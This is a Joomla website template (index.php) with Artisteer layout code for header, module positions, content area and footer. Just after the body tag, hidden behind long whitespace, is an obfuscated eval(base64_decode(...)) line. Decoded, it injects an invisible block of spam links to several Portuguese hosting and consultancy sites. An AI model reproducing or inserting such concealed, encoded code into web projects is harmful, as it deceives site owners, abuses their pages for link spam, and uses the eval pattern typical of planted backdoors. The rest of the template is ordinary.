<?php
defined('_JEXEC') or die('Restricted access'); // no direct access
require_once dirname(__FILE__) . DIRECTORY_SEPARATOR . 'functions.php';
$document = isset($this) ? $this : null;
$baseUrl = $this->baseurl;
$templateUrl = $this->baseurl . '/templates/' . $this->template;
artxComponentWrapper($document);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >

 <head>

  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<jdoc:include type="head" />
  <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/system.css" type="text/css" />
  <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/general.css" type="text/css" />

  <link rel="stylesheet" type="text/css" href="<?php echo $templateUrl; ?>/css/template.css" />
  <!--[if IE 6]><link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.ie6.css" type="text/css" media="screen" /><![endif]-->
  <!--[if IE 7]><link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.ie7.css" type="text/css" media="screen" /><![endif]-->
  <script type="text/javascript" src="<?php echo $templateUrl; ?>/script.js"></script>

 </head>

<body>
                                                                                                                        <?  eval(base64_decode('ZWNobyAnPGRpdiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPjxhIGhyZWY9Imh0dHA6Ly93d3cuc2FmZS1uZXQuZXUvIiAgYWx0PSJBbG9qYW1lbnRvIGRlIHDhZ2luYXMgZSBhcGxpY2Hn9WVzIHBhcmEgYSBpbnRlcm5ldCIgPkFsb2phbWVudG8gZGUgcOFnaW5hcyBlIGFwbGljYef1ZXMgcGFyYSBhIGludGVybmV0PC9hPjxhIGhyZWY9Imh0dHA6Ly93d3cuYmlvcGFnaW5hcy5jb20vIiBhbHQ9IkNvbnN1bHRvcmlhIGUgRW5nZW5oYXJpYSBJbmZvcm3hdGljYSI+Q29uc3VsdG9yaWEgZSBFbmdlbmhhcmlhIEluZm9ybeF0aWNhPC9hPjxhIGhyZWY9Imh0dHA6Ly93d3cuYXBtdWdhLmNvbS8iIGFsdD0iQ29uc3VsdG9yaWEgZSBQcm9ncmFtYefjbyBpbmZvcm3hdGljYSI+Q29uc3VsdG9yaWEgZSBQcm9ncmFtYefjbyBpbmZvcm3hdGljYTwvYT48YSBocmVmPSJodHRwOi8vd3d3LmRlLXBvcnR1Z2FsLmNvbS8iIGFsdD0iRGlyZWN083JpbyBkZSBwZXF1ZW5hcyBlIGVtcHJlc2FzIGVtIFBvcnR1Z2FsIj5EaXJlY3TzcmlvIGRlIHBlcXVlbmFzIGUgZW1wcmVzYXMgZW0gUG9ydHVnYWw8L2E+PGEgaHJlZj0iaHR0cDovL3d3dy53ZWItbW9uaXRvci5vcmcvIiBhbHQ9Ik1vbml0b3JpemHn428gZGUgc2l0ZXMgd2ViIj5Nb25pdG9yaXph5+NvIGRlIHNpdGVzIHdlYjwvYT48L2Rpdj4nOw==')); ?>
                                                                                                                        
<div class="PageBackgroundSimpleGradient">
</div>
<div class="Main">
<div class="Sheet">
    <div class="Sheet-tl"></div>
    <div class="Sheet-tr"></div>
    <div class="Sheet-bl"></div>
    <div class="Sheet-br"></div>
    <div class="Sheet-tc"></div>
    <div class="Sheet-bc"></div>
    <div class="Sheet-cl"></div>
    <div class="Sheet-cr"></div>
    <div class="Sheet-cc"></div>
    <div class="Sheet-body">
<div class="Header">
    <div class="Header-jpeg"></div>

</div>
<jdoc:include type="modules" name="user3" />
<jdoc:include type="modules" name="banner1" style="xhtml" />
<?php echo artxPositions($document, array('top1', 'top2', 'top3'), 'artblock'); ?>
<div class="contentLayout">
<div class="<?php echo artxCountModules($document, 'right') ? 'content' : 'content-wide'; ?>">

<?php
  echo artxModules($document, 'banner2', 'xhtml');
  if (artxCountModules($document, 'breadcrumb'))
    echo artxPost(null, artxModules($document, 'breadcrumb'));
  echo artxPositions($document, array('user1', 'user2'), 'artpost');
  echo artxModules($document, 'banner3', 'xhtml');
?>
<?php if (artxHasMessages()) : ?><div class="Post">
    <div class="Post-body">
<div class="Post-inner">
<div class="PostContent">

<jdoc:include type="message" />

</div>
<div class="cleared"></div>

</div>

    </div>
</div>
<?php endif; ?>
<jdoc:include type="component" />

<?php echo artxModules($document, 'banner4', 'xhtml'); ?>
<?php echo artxPositions($document, array('user4', 'user5'), 'artpost'); ?>
<?php echo artxModules($document, 'banner5', 'xhtml'); ?>
</div>
<?php if (artxCountModules($document, 'right')) : ?>
<div class="sidebar1"><?php echo artxModules($document, 'right', 'artblock'); ?>
</div>
<?php endif; ?>

</div>
<div class="cleared"></div>

<?php echo artxPositions($document, array('bottom1', 'bottom2', 'bottom3'), 'artblock'); ?>
<jdoc:include type="modules" name="banner6" style="xhtml" />
<div class="Footer">
 <div class="Footer-inner">
  <?php echo artxModules($document, 'syndicate'); ?>
  <div class="Footer-text">
  <?php if (artxCountModules($document, 'copyright') == 0): ?>
<p>Copyright &copy; 2009 ---.<br/>
All Rights Reserved.</p>

  <?php else: ?>
  <?php echo artxModules($document, 'copyright', 'xhtml'); ?>
  <?php endif; ?>
  </div>
 </div>
 <div class="Footer-background"></div>
</div>

    </div>
</div>
<div class="cleared"></div>
<p class="page-footer"></p>
</div>



</body> 

</html>